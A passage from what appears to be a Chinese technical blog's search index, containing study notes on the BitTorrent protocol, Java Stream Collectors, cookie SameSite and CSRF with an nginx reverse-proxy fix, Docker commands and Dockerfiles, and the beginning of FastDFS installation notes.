-编码的循环。\npeer_id：下载器使用的长度为20的字符串作为其ID。每个下载器在新的下载开始时随机生成自己的ID。该值也几乎肯定需要进行转义。\nip：可选参数，给出该对等体的IP（或DNS名称）。通常用于原点，如果它与跟踪器在同一台机器上。\nport：该对等体正在监听的端口号。通常的行为是下载器尝试监听6881端口，如果该端口已被占用，则尝试6882、6883等，并在6889之后放弃。\nuploaded：到目前为止，总共上传的量，以十进制ASCII编码。\ndownloaded：到目前为止，总共下载的量，以十进制ASCII编码。\nleft：该对等体仍需下载的字节数，以十进制ASCII编码。请注意，这不能从下载量和文件长度计算出来，因为它可能是恢复下载，且有可能部分下载的数据未通过完整性检查，必须重新下载。\nevent：这是一个可选键，映射到started、completed或stopped（或空，表示与不出现时相同）。如果不存在，则这是定期进行的公告之一。当下载首次开始时，会发送使用started的公告；当下载完成时，会发送使用completed的公告。如果文件在开始时已完成，则不会发送completed。下载者在停止下载时发送一个使用stopped的公告。\n\n跟踪器响应是bencoded字典。如果跟踪器响应有一个键failure reason，则它映射到一个可读字符串，解释查询失败的原因，且不需要其他键。否则，它必须有两个键：interval，映射到下载器应该等待的秒数，以便进行定期重新请求，和peers。peers映射到对应对等体的字典列表，每个字典包含peer id、ip和port键，分别映射到对等体自选的ID、IP地址或DNS名称作为字符串和端口号。请注意，下载者在发生事件或需要更多对等体时，可以在非预定时间重新请求。\n更常见的是，跟踪器返回对等体列表的紧凑表示，见BEP 23。如果您想对元信息文件或跟踪器查询进行任何扩展，请与Bram Cohen协调，以确保所有扩展都是兼容的。通常通过UDP跟踪器协议进行公告。\n对等协议BitTorrent的对等协议通过TCP或uTP运行。对等连接是对称的。双向发送的消息看起来相同，数据可以在任一方向流动。\n对等协议通过索引引用文件的片段，如元信息文件中所描述，从零开始。当对等体完成下载一个片段并检查哈希匹配时，它会向所有对等体宣布它拥有该片段。连接在两端包含两个状态位：阻塞或不阻塞，以及感兴趣或不感兴趣。阻塞是一个通知，在解除阻塞之前不会发送任何数据。阻塞背后的原因和常见技术将在本文档后面解释。\n数据传输发生在一个对等体（peer）感兴趣而另一个对等体没有被阻塞（unchoked）时。兴趣状态必须始终保持更新——当下载者在未被阻塞的情况下，发现没有什么需要请求的内容时，他们必须表达缺乏兴趣，即使他们当前被阻塞。这一过程的实现比较复杂，但这样做的目的是让下载者能够知道，哪些对等体在解除阻塞后会立即开始下载。\n连接开始时被阻塞且不感兴趣。当数据正在传输时，下载者应同时保持多个片段请求排队，以获得良好的TCP性能（这被称为“流水线”）。另一方面，无法立即写入TCP缓冲区的请求应在内存中排队，而不是保留在应用程序级别的网络缓冲区，以便在发生阻塞时可以全部丢弃。对等协议的消息流由握手开始，后跟一个永无止境的长度前缀消息流。握手以字符19（十进制）开头，后跟字符串“BitTorrent protocol”。前导字符是长度前缀，旨在希望其他新协议也能这样做，从而彼此显著区分。所有后续发送的整数都以四字节大端格式编码。在固定头之后，有八个保留字节，当前实现中都为零。如果您希望使用这些字节扩展协议，请与Bram Cohen协调，以确保所有扩展都是兼容的。\n接下来是元信息文件中info值的20字节SHA1哈希（这是跟踪器上公告为info_hash的相同值，只是在这里是原始的而不是引用的）。如果双方发送的值不相同，则断开连接。一个可能的例外是，如果下载者希望通过单个端口进行多个下载，他们可能会等待传入连接首先提供下载哈希，并在其列表中如果存在则响应相同的值。握手之后，接下来是一个交替的长度前缀和消息的流。长度为零的消息是保持活跃消息，忽略。保持活跃消息通常每两分钟发送一次，但在期望数据时超时可以更快完成。\n对等消息所有非保持活跃消息以一个单字节开头，表示其类型。\n可能的值是：\n\n0 - choke\n1 - unchoke\n2 - interested\n3 - not interested\n4 - have\n5 - bitfield\n6 - request\n7 - piece\n8 - cancel\n\n“choke”、“unchoke”、“interested”和“not interested”没有负载。“bitfield”只在首次消息中发送。其负载是一个比特字段，下载者发送的每个索引设置为1，其余设置为0。尚未拥有任何内容的下载者可以跳过“bitfield”消息。比特字段的第一个字节对应于高位到低位的索引0-7，第二个字节对应于8-15，以此类推。末尾的闲置位设置为零。“have”消息的负载是一个单一数字，即该下载者刚刚完成并检查哈希的索引。“request”消息包含索引、开始和长度。最后两个是字节偏移。长度通常是2的幂，除非在文件末尾被截断。所有当前实现使用2^14（16 KiB），并关闭请求大于该量的连接。“cancel”消息的负载与请求消息相同。它们通常仅在下载接近完成时发送，在所谓的“结束模式”下。当下载几乎完成时，最后几个片段通常全部从一个拥挤的调制解调器线路下载，耗时很长。为了确保最后几个片段快速到达，一旦所有该下载者尚未拥有的片段的请求正在进行，它会向所有正在下载的对等体发送请求。为了避免效率低下，它在每次接收到片段时向其他所有对等体发送取消。“piece”消息包含索引、开始和片段。请注意，它们与请求消息隐含相关。如果在快速连续发送的阻塞和解除阻塞消息中，可能会收到意外的片段。\n下载者通常以随机顺序下载片段，这样可以合理地避免拥有任何对等体的片段的严格子集或超集。阻塞是出于多种原因。TCP拥塞控制在同时通过多个连接发送时表现非常差。此外，阻塞让每个对等体使用一种互惠算法，确保它们获得一致的下载速度。\n以下描述的阻塞算法是当前部署的算法。所有新算法在由它们自身组成的网络中和以此为主的网络中都应良好运作。一个好的阻塞算法应满足多个标准。它应限制同时上传的数量以确保良好的TCP性能。它应避免快速阻塞和解除阻塞，这称为“颤动”。它应对让其下载的对等体进行互惠。最后，它应偶尔尝试未使用的连接，以查找它们是否可能比当前使用的连接更好，这称为乐观解除阻塞。\n当前部署的阻塞算法通过每十秒钟仅更改被阻塞的对象，避免了颤动。它通过解除四个上传速率最佳且感兴趣的对等体来实现互惠和上传数量的限制。那些上传速率更好但不感兴趣的对等体会被解除阻塞，如果它们变得感兴趣，则最差的上传者会被阻塞。如果下载者拥有完整文件，它会使用其上传速率而非下载速率来决定解除哪个对等体的阻塞。在乐观解除阻塞方面，任何时候都有一个对等体被解除阻塞，无论其上传速率如何（如果感兴趣，它会算作四个允许的下载者之一）。被乐观解除阻塞的对等体每30秒轮换一次。为了给它们一个良好的机会上传完整的片段，新连接比当前乐观解除阻塞的连接更有三倍的可能性。\n参考The BitTorrent Protocol Specification\n","categories":["学习笔记"],"tags":["Bencode编码","BitTorrent","p2p"]},{"title":"Collector收集器的使用","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Collector%E6%94%B6%E9%9B%86%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8/","content":"前言之前写过一些 stream 流的用法。从那之后，用 stream 流就用的很开心。但是，有时候也会疑惑。stream 流最后的终止操作，经常会这么写：list.stream().collect(Collectors.toList());虽然知道是将流的数据收集到 list 集合中，但不知道为什们这么写。而且，也有这种简化写法：list.stream().toList()。在 Java16 才加入了这个写法。更让人想知道，Collectors 返回的 Collector 收集器到底怎么使用？\n另外，toList() 与 Collectors.toList() 是有区别的。查看源码，可以看到 toList() 返回的是不可变的 list。而 Collectors.toList() 返回的是可变的 list。\ndefault List&lt;T&gt; toList() &#123;     return (List&lt;T&gt;) Collections.unmodifiableList(new ArrayList&lt;&gt;(Arrays.asList(this.toArray()))); &#125;\n\npublic static &lt;T&gt;Collector&lt;T, ?, List&lt;T&gt;&gt; toList() &#123;    return new CollectorImpl&lt;&gt;(ArrayList::new, List::add,                               (left, right) -&gt; &#123; left.addAll(right); return left; &#125;,                               CH_ID);&#125;\n\n后面，来说 Collector 的用法。\ncollect、Collector、Collectors 区别与关联\ncollect 是 Stream 流的一个终止方法，会使用传入的收集器（入参）对结果执行相关的操作，这个收集器必须是 Collector 接口的实现类。\nCollector 是一个接口，定义了一些方法，作用是将 Stream 流中的数据收集到集合中。\nCollectors 是一个工具类，提供了很多的静态工厂方法，提供了很多常用的 Collector 接口的具体实现类，方便使用。\n\nCollector 接口Collector 在 javadoc 中的描述是这样的：\n\nA mutable reduction operation that accumulates input elements into a mutable result container, optionally transforming the accumulated result into a final representation after all input elements have been processed. Reduction operations can be performed either sequentially or in parallel.\n\nCollector是一种可变的汇聚操作，它将输入元素累积到一个可变的结果容器中。在所有的元素处理完成后，Collector 将累积的结果转换成一个最终的表示（这是一个可选的操作）。Collector支持串行和并行两种方式执行。\n先来简单看下 Collector 接口的源码（省略两个静态 of 方法，用于构造 Collector 实现类）\npublic interface Collector&lt;T, A, R&gt; &#123;    Supplier&lt;A&gt; supplier();    BiConsumer&lt;A, T&gt; accumulator();    BinaryOperator&lt;A&gt; combiner();    Function&lt;A, R&gt; finisher();    Set&lt;Characteristics&gt; characteristics();    enum Characteristics &#123;        CONCURRENT,        UNORDERED,        IDENTITY_FINISH    &#125;    // ...&#125;\n\nCollector 接口定义了 3 个泛型、5 个接口方法、2个静态方法、3 个枚举值。\n泛型含义\nT：输入元素的类型\nA：累积结果的容器类型\nR：最终生成的结果类型\n\n接口方法含义\nsupplier 方法：用来创建一个新的可变的集合。换句话说 Supplier 用来创建一个初始的集合。\naccumulator 方法：定义了累加器，用来将原始元素添加到集合中。\ncombiner 方法：用于对并行操作生成的各个子集合结果进行合并。只有并行流会被调用。\nfinisher 方法：对遍历结束后的流做最后处理。可以省略，省略就是 i -&gt; (R) i;，恒等操作。\ncharacteristics：返回一个不可变的 Characteristics 集合。它定义了收集器的行为，关于流是否可以并行归约，以及可以使用哪些优化的提示。\n\n前四个方法都是函数式接口，可以用 lambda 表达式简化表示。所以下面示例时使用 lambda，不单独创建实现类。\n静态方法两个重载的静态方法 of 都用于构造 Collector 实现类。区别在于是否省略 finisher 方法。最后一个参数是 characteristics 枚举，为可变长度参数列表，可传多个。\n枚举值含义\nUNORDERED：声明此收集器的汇总归约结果与 Stream 流元素遍历顺序无关，不受元素处理顺序影响。但是如果容器本身是有序的，那么这个收集器会保证元素顺序不变。\nCONCURRENT：声明此收集器可以多个线程并行处理，允许并行流中进行处理。即 supplier 方法只会被调用一次，只创建一个结果容器，并且 combiner 方法不会被执行，这个容器必须是线程安全的。\nIDENTITY_FINISH：声明此收集器的 finisher 方法是一个恒等操作，可以跳过。默认值。\n\n\n需要注意的是即使 collector 被标记为 UNORDERED 如果数据源或操作本身是有序的，那么系统的执行策略通常仍会保持这些元素的出现顺序。由于在处理有序流时多个线程并发更新同一个共享的累加器容器，会导致元素的更新顺序变得不确定。所以系统通常会忽略有序源的 CONCURRENT 标记。除非同时还指定了 UNORDERED。\n\n自定义 Collector 实现类有一个数组 a,b,c,d,e,f,g下面通过自定义的 collector 实现，返回一个 本身为 key，ascii 码为值的 map 集合。同时，通过打印信息区分串行流与并行流的执行区别。\n串行流（单线程顺序执行）\npublic static void main(String[] args) &#123;    Map&lt;String, Integer&gt; res = Stream.of(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;)            .collect(Collector.of(                    () -&gt; &#123;                        System.out.println(Thread.currentThread().getName() + &quot; supplier...&quot;);                        return new HashMap&lt;String, Integer&gt;();                    &#125;,                    (left, right) -&gt; &#123;                        System.out.println(Thread.currentThread().getName() + &quot; accumulator: &quot; + right);                        left.put(right, (int) right.getBytes()[0]);                    &#125;,                    (left, right) -&gt; &#123;                        System.out.println(Thread.currentThread().getName() + &quot; combiner: &quot; + left + &quot;+&quot; + right);                        left.putAll(right);                        return left;                    &#125;            ));    res.forEach((k, v) -&gt; System.out.println(k + &quot;:&quot; + v.toString()));&#125;\n\n串行流输出结果：\nmain supplier...main accumulator: amain accumulator: bmain accumulator: cmain accumulator: dmain accumulator: emain accumulator: fmain accumulator: ga:97b:98c:99d:100e:101f:102g:103\n\n可以看到串行流中 supplier 方法只执行一次，并且 combiner 方法没有执行。\n并行流\npublic static void main(String[] args) &#123;    Map&lt;String, Integer&gt; res = Stream.of(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;).parallel()            .collect(Collector.of(                    () -&gt; &#123;                        System.out.println(Thread.currentThread().getName() + &quot; supplier...&quot;);                        return new HashMap&lt;String, Integer&gt;();                    &#125;,                    (left, right) -&gt; &#123;                        System.out.println(Thread.currentThread().getName() + &quot; accumulator: &quot; + right);                        left.put(right, (int) right.getBytes()[0]);                    &#125;,                    (left, right) -&gt; &#123;                        System.out.println(Thread.currentThread().getName() + &quot; combiner: &quot; + left + &quot;+&quot; + right);                        left.putAll(right);                        return left;                    &#125;            ));    res.forEach((k, v) -&gt; System.out.println(k + &quot;:&quot; + v.toString()));&#125;\n\n并行流输出结果：\nmain supplier...ForkJoinPool.commonPool-worker-1 supplier...ForkJoinPool.commonPool-worker-2 supplier...ForkJoinPool.commonPool-worker-4 supplier...ForkJoinPool.commonPool-worker-5 supplier...ForkJoinPool.commonPool-worker-3 supplier...ForkJoinPool.commonPool-worker-6 supplier...ForkJoinPool.commonPool-worker-4 accumulator: dForkJoinPool.commonPool-worker-1 accumulator: bmain accumulator: eForkJoinPool.commonPool-worker-6 accumulator: cForkJoinPool.commonPool-worker-2 accumulator: aForkJoinPool.commonPool-worker-3 accumulator: gForkJoinPool.commonPool-worker-5 accumulator: fForkJoinPool.commonPool-worker-6 combiner: &#123;b=98&#125;+&#123;c=99&#125;ForkJoinPool.commonPool-worker-6 combiner: &#123;a=97&#125;+&#123;b=98, c=99&#125;ForkJoinPool.commonPool-worker-5 combiner: &#123;f=102&#125;+&#123;g=103&#125;main combiner: &#123;d=100&#125;+&#123;e=101&#125;main combiner: &#123;d=100, e=101&#125;+&#123;f=102, g=103&#125;main combiner: &#123;a=97, b=98, c=99&#125;+&#123;d=100, e=101, f=102, g=103&#125;a:97b:98c:99d:100e:101f:102g:103\n\n可以看出并行流的执行逻辑。\n\nspliterator 分割迭代器 会将数据分割成多个片段，分割过程通常采用递归的方式动态进行，以平衡子任务的工作负载，提高资源利用率。\nFork&#x2F;Join 框架将这些数据片段分配到多个线程和处理器核心上进行并行处理。\n处理完成后，结果会被汇总合并。合并过程通常也是递归进行的。\n\nCollectors 常用收集器Collectors 提供了一系列的静态方法，一般情况下足够正常使用。不然我也不会用这么久 stream 才来详细了解 Collector 了。\n方法比较多，很多我也没用过。这里就不一一列举用法了。用的时候查文档吧。不然我和写文档有什么区别\n","categories":["学习笔记"],"tags":["java","stream"]},{"title":"Cookie的SameSite跨站限制","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/Cookie%E7%9A%84SameSite%E8%B7%A8%E7%AB%99%E9%99%90%E5%88%B6/","content":"场景一个前端vue，后端springboot的项目部署在服务器上。此时，想编写dockerfile，将他们放在docker中再部署。方便部署到其他地方。\n编写完vue的dockerfile后，运行。然后访问。发现每次请求的sessionId都不一样。（已经不知道多少次出现这个现象了，肯定是跨域的问题然后排错，发现 Set-Cookie 响应头的值后面有个黄色的警告：此Set-Cookie标头未指定“SameSite“属性，它默认为”SameSite=Lax“，必须为此SetCookie设置“SameSite=None“才能实现跨站点使用\n于是去查了 SameSite 属性\nSameSite 属性微软文档 SameSite cookie 属性\ncookies 机制一直被认为是不安全的。SameSite 属性是谷歌浏览器为完善 cookies 安全机制出的特性之一。Chrome 80 于 2020 年 2 月发布，引入了新的 Cookie 值 SameSite，并默认实施 Cookie 策略。SameSite 属性有三个可选值 Strict、Lax 或 None。 如果未指定，则 Cookie SameSite 属性默认采用值 SameSite&#x3D;Lax。ameSite 属性用来限制第三方 Cookie的行为。\n\n\n\n设置\n强制执行\n值\n属性规范\n\n\n\nLax\n大多数情况也不发送第三方Cookie，但是导航到目标站点的Get请求、预加载（link标签）和链接（a标签）除外。\nDefault\nSet-Cookie:key&#x3D;value;SameSite&#x3D;Lax\n\n\nStrict\n完全禁止第三方Cookie，当当前站点与请求目标站点是跨站关系时，总是不会发送Cookie。换言之，只有当前站点与请求目标站点是同站关系时，才会带上Cookie。\n可选\nSet-Cookie:key&#x3D;value;SameSite&#x3D;Strict\n\n\nNone\n允许第三方Cookie，始终发送。站点选择显式关闭SameSite属性时，在将其值设为None的同时。必须同时设置Secure属性（表示Cookie只能通过HTTPS协议发送），否则无效。\n可选，但如果设置，则需要HTTPS协议。\nSet-Cookie:key&#x3D;value;SameSite&#x3D;None;Secure\n\n\n默认值为 Lax，基本只有只读请求（资源请求和Get，不会改变服务器资源）会携带 Cookie。其他POST（会执行数据库 insert、update和delete）的请求不会携带 Cookie更加详细地，关于 http 和 https 等情况 Cookie 的携带情况可以参考下面这篇博客园的文章\nCookies的SameSite属性\n\n这里有一个注意点，跨域和跨站的区别：源是 协议、主机名、端口 的组合，同源要求三者完全相同。一般的同站域名相同即可，但也有同协议同站，因为考虑到攻击者会利用不安全的http发起CSRF攻击一个https安全站点。详细参考：讲清楚同源、跨源、同站、跨站\n\n问题的解决方案知道 SameSite 属性有什么作用之后，也就知道了上面遇到问题的原因：\n前端项目放在 docker 中，docker 跑在本地，浏览器访问本地 127.0.0.1后端服务跑在服务器，浏览器访问公网ip这肯定是跨站的，由于所使用的浏览器比较新，Cookie 的 SameSite 属性默认值为 Laz，所以不会携带 Cookie。后端服务会认为这些请求都是新用户发起，因为没有获得 SessionId ，所以每次都会新建一个 Session，并将 SessionId 设置进 cookie 中。\n而部署在同一个服务器上的前端项目则不会有这个问题。因为是同站的。\n也没有什么好的解决方案，因为我的服务器没有配置域名，所以没有是用不了 https 协议。以至于无法设置 SameSite 属性为 None。因为是在开发测试阶段，所以影响不大。使用低版本的浏览器访问或许可以。\n然后就是查阅的博客和资料中都提到了 CSRF攻击，后面记录下。\n另外，有个问题：前后端服务部署在同一个服务器上不会有问题，但是部署到不同服务器…那不就是我现在遇到问题的情况吗，首先想到的解决办法就是 nginx 的反向代理。后面去验证下。\nCSRF攻击什么是CSRF？如何防御CSRF攻击？前端 | CSRF 的攻击类型与防御【基本功】 前端安全系列之二：如何防止CSRF攻击？\nCSRF（Cross-Site Request Forgery），也被称为 one-click attack 或者 session riding，即跨站请求伪造攻击。是一种劫持受信任用户向服务器发送非预期请求的攻击方式。攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。\n简单来说，就是用户持有网站A验证过的 Cookie，有进行相关的请求的权限。此时，该用户访问了网站B，那B就可以向A发送跨站请求。浏览器会将这些请求加上有效的 Cookie，B就达到可以对A执行某些操作的目的。\nCSRF 利用的是网站对用户网页浏览器的信任。\n所以 SameSite 属性限制了 跨站请求 Cookie 的携带。一定程度上可以防止 CSRF 攻击。\nnginx 反向代理vue 中将所有请求加上前缀\nimport axios from &#x27;axios&#x27;;const app = axios.create(&#123;    baseURL: &#x27;/api&#x27;,    timeout: 10000,&#125;);export default app;\n\n这时，vue 中所有 axios 请求都会请求 ip:host&#x2F;api&#x2F;真实后端请求\n然后，在 nginx 中配置反向代理\nconfigurationserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    location / &#123;        root   /usr/share/nginx/html;        index  index.html index.htm;    &#125;      # 代理后端API的配置    location /api/ &#123; # 用于转发的路径标记        proxy_pass http://ip:8080/; # 被代理的API地址    &#125;&#125;\n\n这时，前端所有请求都是同源的。不会有任何的跨域问题。（至少我认为不会有静态资源的请求 nginx 会处理并返回动态资源的请求 nginx 会转发浏览器完全感觉不到后端的存在，即便是查看请求信息。（可以隐藏真实的服务端\n其他参考深入理解 Cookie 的 SameSite 属性Feature: Cookies default to SameSite&#x3D;Lax当浏览器全面禁用三方 Cookie完美解决Chrome Cookie SameSite跨站限制cookie session都过时了，现在是HTML5时代\n","categories":["编程记录"],"tags":["cookie","跨域","跨站","CSRF攻击","nginx","反向代理"]},{"title":"docker笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Docker%E7%AC%94%E8%AE%B0/","content":"简介虚拟化虚拟化是一种计算机资源管理技术。指通过虚拟化技术将一台计算机虚拟为多台逻辑计算机。在一台计算机上同时运行多个逻辑计算机，每个逻辑计算机可运行不同的操作系统，并且应用程序都可以在相互独立的空间内运行而互不影响，从而显著提高计算机的工作效率。  \n虚拟化分类（略，因为过于复杂，了解即可）  \n优点：一台物理机可以虚拟化多个服务器，让计算机资源利用更充分。缺点：\n\n每个虚拟机都会创建一个操作系统，会增加资源的消耗。\n环境兼容问题。\n\n容器技术运行在操作系统之上的虚拟化技术，模拟的运行在一个操作系统上的多个不同进程，封装在容器中。  \ndocker发布于2013年，基于LXC技术。LXC是linux Container，是一种内核虚拟化技术。提供轻量级的虚拟化，以便隔离进程和资源。与宿主机使用同一内核，性能损耗小。\ndocker是开源的应用容器引擎，基于go语言实现。docker官网docker技术可以让开发者将开发好的应用和依赖包打包到容器中，以便可以运行在任意linux服务器上，解决开发环境与运维环境不同的问题。docker本省不是容器，是管理容器的引擎。  \n环境搭建安装docker支持CentOS6及以上版本。CentOS7可以使用yum install docker -y直接安装。  \n\n服务启动关闭等启动：systemctl start docker或者service docker start停止：systemctl stop docker或者service docker stop重启：systemctl restart docker或者service docker restart查看运行状态：systemctl status docker或者service docker status\n查看docker系统信息：docker info查看docker所有帮助信息：docker查看某个命令帮助信息：docker commond --help\ndocker运行机制启动服务–&gt;下载镜像–&gt;启动该镜像得到一个容器–&gt;容器里运行应用\n\n启动服务\n下载镜像，如果本地没有对应镜像，则会从镜像仓库下载，默认仓库搜索镜像：docker search tomcat下载镜像：docker pull tomcat运行镜像：docker run tomcat 后台运行：docker run -d tomcat-p 参数映射端口显示本地已有镜像：docker images\n\n进入docker容器进入容器：docker exec -it 容器id bashi表示交互式的，即保持标准输入流打开t表示虚拟控制台退出容器：exit\n从客户机访问容器，需要有端口映射，docker容器默认采用桥接模式与宿主机通信，需要将宿主机ip端口映射到容器ip端口上。停止容器：docker stop 容器id/名称启动容器：docker run -d -p 8080:8080 tomcat\ndocker核心组件docker是客户端-服务器（C&#x2F;S）加厚，通过远程API来管理和创建容器。docker通过镜像来创建容器。  \n镜像镜像是一个只读的模板，用于创建容器。\n镜像由许多层文件系统构成第一层是引导文件系统bootfs第二层是root文件系统rootfs，root文件系统通常是某种操作系统root系统之上又有很多层文件系统，这些文件系统叠加在一起，构成docker中的镜像\n进入容器：docker exit -it 镜像id bash删除镜像：docker rmi 镜像名，rm是删除容器\n容器通过镜像启动容器：docker run -d 镜像名查看运行中的容器：docker ps查看所有的容器：docker ps -a停止容器：docker stop 容器id/名称开启容器：docker start 容器id/名称删除容器：docker rm 容器id/名称 删除容器时，容器必须是静止状态，否则会报错查看容器更多信息：docker inspect 容器id/名称停止全部运行中的容器：docker stop $(docker ps -q)删除全部容器：docker rm $(docker ps -aq)\n仓库仓库是集中存放镜像文件的地方。仓库分为公开仓库和私有仓库。最大的公开仓库是Docker Hub\n阿里云镜像\n查找官方镜像：docker search 镜像名下载镜像：docker pull 镜像名\n自定义镜像dockerfile用于构建docker镜像，有一行行命令语句构成，基于这些命令可以构建一个镜像。  \ndockerfile分为四部分\n\n基础镜像信息\n维护者信息\n镜像操作命令\n容器启动时执行指令\n\n指令\nFROMFROM &lt;images&gt; / FROM &lt;images&gt;:&lt;tag&gt; / FROM &lt;images&gt;:&lt;digest&gt;用于指定所使用的基础镜像\nFROM必须是dockerfile第一条非注释指令FROM可以出现多次，用于在一个dockerfile中创建多个镜像tag&#x2F;digest是可选的，默认latest版本基础镜像\n\n\nMAINTAINERMAINTAINER &lt;name&gt;指定维护者信息\nENVENV &lt;key&gt; &lt;value&gt; / ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...设置环境变量，会被后续RUN指令使用，并在容器运行时保持。\nCOPYADD &lt;源路径&gt;... &lt;目标路径&gt; / ADD [&quot;&lt;源路径&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;]复制指定文件到容器中指定位置。\n源文件的各种元数据都会保留。比如读、写、执行权限、文件变更时间等。\n\n\nADDADD &lt;源路径&gt;... &lt;目标路径&gt; / ADD [&quot;&lt;源路径&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;]复制指定文件到容器中指定位置，与COPY格式基本一致，但比COPY增加了一些功能。如源路径可以是url\n如果 docker 发现文件内容被改变，则接下来的指令都不会再使用缓存。\n\n\nRUN#shell格式RUN &lt;command&gt;#exec格式RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]\n用于构建过程中，执行特定命令，并生成一个中间镜像。  \nRUN 指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，可以在构建时指定 –no-cache 参数，如：docker build –no-cache。\n\n\nCMDCMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]CMD [&quot;param1&quot;,&quot;param2&quot;]CMD command param1 param2\n用于指定容器启动时命令。\n与 RUN 指令的区别：RUN 在构建的时候执行，并生成一个新的镜像，CMD 在容器运行的时候执行，在构建时不进行任何操作。每个dockerfile只能有一条CMD命令。如果有多条，只有最后一条会被执行。如果用户启动时指定了运行的命令，则会覆盖CMD指定的命令。\n\n\nEXPOSEEXPOSE &lt;port&gt; [&lt;port&gt;...]为构建的镜像设置监听端口，使容器运行时监听\n\n自定义镜像\nJDK镜像创建Dockerfile文件\nFROM centosMAINTAINER rootADD jdk-8u121-linux-x64.tar.gz /usr/localENV JAVA_HOME /usr/local/java/jdk1.8.0_121ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarENV PATH $PATH:$JAVA_HOME/binCMD java -version\n构建镜像：docker build -t root_jdk1.8.0_121 .\n\ntomcat镜像创建Dockerfile文件\nFROM root_jdk1.8.0_121MAINTAINER rootADD apache-tomcat-8.5.24.tar.gz /usr/localENV CATALINA_HOME /usr/local/apache-tomcat-8.5.24ENV PATH $PATH:$CATALINA_HOME/lib:$CATALINA_HOME/binEXPOSE 8080CMD /usr/local/apache-tomcat-8.5.24/bin/catalina.sh run\n构建镜像：docker build -t root_tomcat-8.5.24 .\n\n\n镜像发布到仓库省略在阿里云注册账号，容器镜像服务有详细文档。\nDocker Hub 镜像加速&#x2F;etc&#x2F;docker&#x2F;daemon.json&#123;&quot;registry-mirrors&quot;: [&quot;阿里云提供的网址&quot;]&#125;\ndocker应用部署\n将开发好的程序打成jar包或war包\n将打包好的文件上传至服务器\n定义Dockerfile文件，用于创建项目镜像\n\n定义jar包程序Dockerfile文件\nFROM javaMAINTAINER rootADD springboot-web.jar /optRUN chmod +x /opt/springboot-web.jarCMD java -jar /opt/springboot-web.jar\n构建镜像：docker build -t springboot-web.jar .\n定义war包程序Dockerfile文件\nFROM root_tomcat-8.5.24MAINTAINER rootADD springboot-web.war /usr/local/apache-tomcat-8.5.24/webappsEXPOSE 8080CMD /usr/local/apache-tomcat-8.5.24/bin/catalina.sh run\n构建镜像：docker build -t springboot-web.war .\n修改容器保存：docker commit 容器id 镜像名容器内有新的数据，可以保存为新的镜像。\n总结主要是一些命令，但花了挺长时间。主要碰到了两个问题。\n第一个问题：无法启动tomcat\nCannot find /usr/local/tomcat/bin/setclasspath.shThis file is needed to run this program\n我不知道出现问题的原因是什么，但是找到了解决方案我将tomcat的版本降低后，解决了这个问题。\n第二个问题：也是无法启动tomcat\n/usr/bin/docker-current: Error response from daemon: driver failed programming external connectivity on endpoint affectionate_leakey (31afb261a3eead766cd87d85a7d0b12d048379e3b8715f28367a61e27b228456): Error starting userland proxy: listen tcp 0.0.0.0:8080: bind: address already in use.ERRO[0000] error getting events from daemon: net/http: request canceled\n这个是因为端口占用，而导致的报错。解决方案：kill占用的程序。\n\n查看端口使用情况：netstat -anp查看8080端口使用情况：netstat -anp|grep 8080\n\n","categories":["学习笔记"],"tags":["docker"]},{"title":"FastDFS笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/FastDFS%E7%AC%94%E8%AE%B0/","content":"简介分布式文件系统分布式文件系统（Distributed File System，DFS）是指文件系统管理的物理存储资源不一定直接连接在本地节点上，而是通过计算机网络与节点（可简单的理解为一台计算机）相连；或是若干不同的逻辑磁盘分区或卷标组合在一起而形成的完整的有层次的文件系统。DFS为分布在网络上任意位置的资源提供一个逻辑上的树形文件系统结构，从而使用户访问分布在网络上的共享文件更加简便。单独的 DFS共享文件夹的作用是相对于通过网络上的其他共享文件夹的访问点。常见的分布式文件系统有：FastDFS、GFS、HDFS、Lustre、Ceph、GridFS、mogileFS、TFS等。\n传统存放方式：\n分布式文件存储：\nFastDFSFastDFS是开源的轻量级分布式文件系统，为互联网应用定制，简单、灵活、高效。采用c语言开发，由阿里巴巴开发并开源。FastDFS对文件进行管理，功能包括：文件存储、文件同步（上传、下载、删除）等，解决大容量文件存储问题，特别适合以文件为载体的在线服务。比如文档网站、图片网址、视频网址等FastDFS充分考虑了冗余备份、线性扩容等级制，并注重高可用、高性能等指标，使用它很容易搭建一套高性能的文件服务器集群提供文件上传下载等服务。\n看起来做个人云盘什么的很不错\nFastDFS开源地址\nFastDFS整体架构FastDFS由客户端和服务端构成客户端通常是我们的程序，比如用java去连接FastDFS、操作FastDFS。它提供了专有的api访问服务端由跟踪器（tracker）和存储节点（storage）构成跟踪器主要做调度工作，在内存中记录集群中存储节点storage的状态信息，是前端Client和后端存储节点storage的枢纽。因为相关信息存储在内存中，所以tracker server的性能非常高。存储节点用于存储文件，包括文件和文件属性（meta data）都保存到存储服务器磁盘上，完成文件管理的所有功能：存储、同步、访问等\n环境搭建安装旧版本 FastDFS 说明：FastDFS有一部分是网络通信功能，旧版本FastDFS（FastDFS2.0之前版本）没有直接使用 epoll 实现，而是通过libevent实现（libevent是一个用C语言编写的、轻量级的开源高性能网络库），但是最新版的FastDFS最终网络IO这部分重新用epoll实现所以如果是FastDFS 是 2.0 之前的版本，请先安装好 libevent 环境（新版本不需要安装）\n安装前准备:检查linux是否安装了gcc、libevent、libevent-devel\nyum list installed|grep gccyum list installed|grep libeventyum list installed|grep libevent-devel\n安装\nyum install 